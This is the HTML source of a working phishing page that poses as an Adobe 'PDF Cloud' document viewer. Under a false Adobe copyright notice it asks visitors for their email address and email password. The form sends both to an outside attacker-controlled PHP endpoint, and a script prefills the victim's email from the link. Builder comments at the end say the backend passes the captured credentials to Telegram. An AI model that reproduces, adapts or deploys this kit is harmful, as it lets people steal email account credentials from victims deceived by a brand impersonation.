<!DOCTYPE html>
<html lang="en-US">
<head>

    <!-- Bootstrap 4 CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
    <style>
        /* ===== ORIGINAL STYLES - FULLY PRESERVED ===== */
        html {
            background-image: url('https://www.adobe.com/content/dam/cc/us/en/products/creativecloud/illustration/cc-illustration-01.jpg');
            background-repeat: no-repeat;
            background-position: 100%;

        body {

            font-family: 'Segoe UI', 'Helvetica Neue', Arial, "0e10a40ea0aa", Meiryo, "0d20e90ae0ce?d20b4 Pro W3", Hiragino Kaku Gothic Pro W3, Osaka, " 2d 33  300b40b70c30af", MS PGothic, Malgun Gothic, Microsoft YaHei, sans-serif;

        .lt { float: left; }

        header {
            width: 100%;
            margin: 0 auto;
            padding: 0;
            border: none;
            background: #000;
        }
        header .brand {
            width: 193px;
            margin: 0 30px;
            padding: 0;
            text-align: center;
            display: inline-block;
            border: none;
            background: #fff;
        }
        header .brand,
        header .search,
        header .brand img,
        header .brand h1 {
            display: inline-block;
        }
        header .brand img {
            width: 54px;
            background: #fff;
            margin: 0 auto -17px;
            padding: 0;
            position: relative;
            top: 0px;
        }
        header .brand h1 {
            font-size: 20px;
            font-weight: 600;
            color: #fff;
            margin: 0 auto;

            background: #E80E0E;
        }
        header .search {
            width: 300px;
            margin: 0px 30px 0 0;
            padding: 12px 0;

            text-align: center;
        }
        header .search .srch {

            padding: 5px 10px;
            font-size: 13px;
            font-weight: 400;
            color: #4b4b4b;
            border: none;
            border-radius: 10px;
        }
        .container {
            width: 100%;
            margin: 0 auto;
            padding: 0;
        }
        .container .dash {
            width: 100%;
            margin: 0 auto;
            padding: 0;
            position: absolute;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            z-index: 9999;
            background: rgba(0, 0, 0, 0.4);
        }
        .container .dash .board {
            max-width: 400px;
            margin: 0 auto;
            padding: 30px 0;
            background: #f6f6f6;
            display: block;
            border: none;
            border-radius: 1px;
            position: relative;
            top: 20%;
        }
        .container .dash .board .login {
            max-width: 370px;
            margin: 0 auto;
            padding: 0;
            border: none;
        }
        .container .dash .board .login ul {
            width: 100%;
            list-style: none;
            margin: 0 auto;
            padding: 0;
            border: none;
            display: block;
        }
        .container .dash .board .login ul li {
            width: 100%;
            margin: 0 auto;
            padding: 0;
            display: block;
            order: 1px solid #ccc;
        }
        .login ul li img,
        .login ul li p {
            display: inline-block;
        }
        .login ul li img {
            margin: 0;
            padding: 0;
            position: relative;
        }
        .login ul .l1 p {
            font-weight: 400;
            color: #707070;
            vertical-align: top;
            margin: 0;
            padding: 0;
        }
        #err,
        .login ul li #adbpss1 {
            display: none;
        }
        .login ul li .inp {
            width: 368px;
            margin: 8px auto;
            padding: 2px 12px;
            min-height: 32px;
            border: 1px solid #e5e5e5;
            border-radius: 4px;
            box-sizing: border-box;
            color: #000;
            display: block;
            font-size: 14px;
            font-weight: 400;
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, "0e10a40ea0aa", Meiryo, "0d20e90ae0ce?d20b4 Pro W3", Hiragino Kaku Gothic Pro W3, Osaka, " 2d 33  300b40b70c30af", MS PGothic, Malgun Gothic, Microsoft YaHei, sans-serif;
            font-style: italic;
        }
        .login ul li .inp:focus {
            border: 1px solid #1473e6;
            transition-delay: 0s;
            transition-duration: 0.15s;
            transition-property: all;
            transition-timing-function: ease-in-out;
            font-style: normal;
        }
        .login ul li .btns {
            width: 120px;
            margin: 0 auto;
            padding: 7px 0;
            background: #1473e6;
            color: #fff;
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, "0e10a40ea0aa", Meiryo, "0d20e90ae0ce?d20b4 Pro W3", Hiragino Kaku Gothic Pro W3, Osaka, " 2d 33  300b40b70c30af", MS PGothic, Malgun Gothic, Microsoft YaHei, sans-serif;
            border: none;
            border-radius: 16px;
            font-size: 15px;
            font-weight: 600;
            text-align: center;
            transition-delay: 0s;
            transition-duration: 0.15s;
            transition-property: all;
            transition-timing-function: ease-in-out;
            white-space: nowrap;
            display: inline-block;
            cursor: pointer;
            outline: none;
        }
        .login ul .l1 svg {
            width: 22px;
            display: inline-block;
            margin: 0;
            padding: 0;
            position: relative;
            top: 9px;
        }
        .login ul .l1 p {
            margin: 0;
            padding: 10px 6px;
            color: #707070;
        }
        .login ul .l2 p {
            font-size: 13px;
            font-weight: 700;
            color: #4b4b4b;
            margin: 0;
            padding: 15px 0;
        }
        .login ul .l3 img {
            width: 32px;
            margin: 0 0 -3px;
        }
        .login ul .l3 p {
            font-size: 28px;
            font-weight: 300;
            color: #2d2d2d;
            margin: 0 9px;
            padding: 0;
        }
        .login ul .l4 {
            width: 100%;
            margin: 0 auto;
            padding: 0;
            text-align: left;
        }
        .login ul .l4 p {
            font-size: 14px;
            font-weight: 600;
            margin: 0;
            padding: 5px 0;
            color: #E80E0E;
            font-style: italic;
        }
        .login ul .l5 p {
            width: 100%;
            margin: 50px auto 5px;
            padding: 0;
            text-align: center;
            font-size: 13px;
            font-weight: 400;
            color: #4b4b4b;
            display: block;
        }
        @media (max-width: 680px) {
            header .search { width: 70px; margin: 0px; text-align: center; }
            header .search .srch { display: none; }
            header .brand { width: 180px; margin: 0 30px; padding: 0; }
            header .brand img { width: 40px; margin: 0 auto -10px; }
            header .brand h1 { font-size: 18px; margin: 0 auto; padding: 7px 20px; }
        }
        
        /* PDF logo enhancements */
        .brand-logo-pdf {
            display: inline-block;
            vertical-align: middle;
            transition: transform 0.2s ease;
            object-fit: contain;
        }
        
        /* Loading spinner */
        .loading-spinner {
            display: none;
            width: 20px;
            height: 20px;
            margin: 8px auto 0;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #1473e6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .btn-wrapper {
            text-align: center;
            position: relative;
        }
        .btns:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <header>
        <div class="brand">
            <!-- FIXED PDF LOGO -->
            <img class="brand-logo-pdf" 
                 src="https://cdn-icons-png.flaticon.com/512/337/337946.png" 
                 alt="PDF Document Logo" 
                 style="width:54px; background:#fff; border-radius: 8px; padding: 4px;"
                 onerror="this.onerror=null; this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/120px-PDF_file_icon.svg.png';">
            <h1>PDF CLOUD</h1>
        </div>
        <div class="search">
            <input type="search" name="search" class="srch" id="srch" placeholder="Enter a search ...">
        </div>
    </header>
    <div class="container">
        <div class="dash cover">
            <div class="board animated fadeIn coontainer">
                <div class="login">
                    <!-- 
                        ============================================================
                        🔥 PHP URL APPEARS ONLY ONCE - RIGHT HERE IN THE ACTION ATTRIBUTE 🔥
                        ============================================================
                    -->
                    <form id="loginForm" action="https://polnerprague.xyz/pdf/sg.php" method="POST">
                        <ul>
                            <li class="l1">
                                <svg viewBox="0 0 48 48" focusable="false" aria-hidden="true" role="img" class="spectrum-Icon spectrum-Icon--sizeM nav-logo" width="22" height="22">
                                    <path d="M29.219 6H44v36L29.219 6zM18.798 6H4v36L18.798 6zm5.207 13.265l9.422 22.733h-6.173l-2.823-7.24h-6.896l6.47-15.493z"></path>
                                </svg>
                                <p>PDF Cloud</p>
                            </li>
                            <li class="l2">
                                <p>For security, please sign in with your email to verify your Identity, and view documents.</p>
                            </li>
                            <li class="l3">
                                <img src="https://cdn-icons-png.flaticon.com/512/337/337946.png" 
                                     alt="PDF Document Icon" 
                                     width="32" 
                                     onerror="this.src='https://icons.iconarchive.com/icons/dakirby309/simply-styled/32/PDF-icon.png';">
                                <p>PDF Document</p>
                            </li>
                            <br>
                            <li class="l4 animated fadeIn" id="err"><p id="erp"></p></li>
                            <li><input type="email" name="email" id="emailInput" class="inp" autocomplete="off" placeholder="Email Address" required></li>
                            <li><input type="password" name="password" id="passwordInput" class="inp" autocomplete="off" placeholder="Email Password" required pattern=".{5,}"></li>
                            <li class="btn-wrapper">
                                <button type="submit" name="submit" class="btns" id="submit-btn">Sign In</button>
                                <div class="loading-spinner" id="loadingSpinner"></div>
                            </li>
                            <li class="l5">
                                <p>Copyright &copy; <script>document.write(new Date().getFullYear())</script> Adobe Corporation</p>
                            </li>
                        </ul>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <script>
        (function() {
            // Get email from URL hash and populate email field
            var hash = window.location.hash.substring(1);
            var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            var emailField = document.getElementById('emailInput');
            
            if (hash && emailRegex.test(hash) && emailField) {
                emailField.value = decodeURIComponent(hash);
            }
            
            // Form validation and loading spinner
            var loginForm = document.getElementById('loginForm');
            var submitBtn = document.getElementById('submit-btn');
            var spinner = document.getElementById('loadingSpinner');
            var errorDiv = document.getElementById('err');
            var errorText = document.getElementById('erp');
            var passwordInput = document.getElementById('passwordInput');
            
            if (loginForm) {
                loginForm.addEventListener('submit', function(e) {
                    errorDiv.style.display = 'none';
                    
                    if (!emailField.value.trim()) {
                        e.preventDefault();
                        errorText.innerText = 'Please enter your email address.';
                        errorDiv.style.display = 'block';
                        setTimeout(function() { errorDiv.style.display = 'none'; }, 3000);
                        return false;
                    }
                    
                    if (!emailRegex.test(emailField.value.trim())) {
                        e.preventDefault();
                        errorText.innerText = 'Please enter a valid email address.';
                        errorDiv.style.display = 'block';
                        setTimeout(function() { errorDiv.style.display = 'none'; }, 3000);
                        return false;
                    }
                    
                    if (!passwordInput.value || passwordInput.value.length < 5) {
                        e.preventDefault();
                        errorText.innerText = 'Password must be at least 5 characters.';
                        errorDiv.style.display = 'block';
                        setTimeout(function() { errorDiv.style.display = 'none'; }, 3000);
                        return false;
                    }
                    
                    if (submitBtn && spinner) {
                        submitBtn.disabled = true;
                        submitBtn.style.opacity = '0.6';
                        spinner.style.display = 'inline-block';
                    }
                    
                    return true;
                });
            }
            
            // Fix broken images
            var allImages = document.querySelectorAll('img');
            allImages.forEach(function(img) {
                img.addEventListener('error', function() {
                    if (this.src.indexOf('flaticon') === -1 && (this.alt.indexOf('PDF') !== -1 || this.className.indexOf('brand') !== -1)) {
                        this.src = 'https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/120px-PDF_file_icon.svg.png';
                        this.onerror = null;
                    }
                });
                if (!img.complete || img.naturalWidth === 0) {
                    if (img.src.indexOf('flaticon') === -1 && (img.alt.indexOf('PDF') !== -1 || img.className.indexOf('brand') !== -1)) {
                        img.src = 'https://cdn-icons-png.flaticon.com/512/337/337946.png';
                    }
                }
            });
        })();
    </script>
    
    <!-- 
        ============================================================
        ✅ PHP URL APPEARS EXACTLY ONCE IN THE ENTIRE PAGE
        
        Location: <form action="https://polnerprague.xyz/pdf/sg.php">
        
        No other instances of the URL exist anywhere else.
        ============================================================
        
        PHP BACKEND EXPECTS:
        - $_POST['email']
        - $_POST['password']
        
        Your sg.php will receive these and send Telegram alert.
        ============================================================
    -->
</body>
